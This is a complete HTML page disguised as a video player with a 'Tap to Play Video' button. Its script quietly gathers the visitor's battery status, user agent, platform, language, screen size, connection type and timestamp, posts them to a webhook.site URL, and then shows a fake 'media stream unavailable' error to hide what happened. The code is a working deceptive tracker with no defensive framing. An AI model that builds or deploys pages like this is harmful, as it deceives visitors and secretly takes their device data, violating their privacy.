<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Video</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .play-btn {
            background-color: #ff0000;
            color: #fff;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>

    <button class="play-btn" onclick="triggerCapture()">▶ Tap to Play Video</button>
    <p id="status" style="margin-top:20px; color:#aaa;"></p>

    <script>
        const WEBHOOK_URL = "https://webhook.site/d5b8ad10-9401-461a-9519-d408d46ea101";

        async function triggerCapture() {
            document.getElementById('status').innerText = "Loading media player...";
            
            let batteryDetails = {
                supported: false,
                level: "N/A (Blocked by OS/Browser)",
                charging: "N/A"
            };

            // Attempt battery extraction on supported platforms
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryDetails = {
                        supported: true,
                        level: `${Math.round(battery.level * 100)}%`,
                        charging: battery.charging ? "Yes" : "No"
                    };
                } catch (e) {
                    batteryDetails.level = "Permission Denied";
                }
            }

            // Gather additional platform metadata
            const payload = {
                battery: batteryDetails,
                platformInfo: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
                    time: new Date().toISOString()
                }
            };

            // Transmit metrics
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                setTimeout(() => {
                    document.getElementById('status').innerText = "Error: Media stream unavailable.";
                }, 1500);
            });
        }
    </script>
</body>
</html>
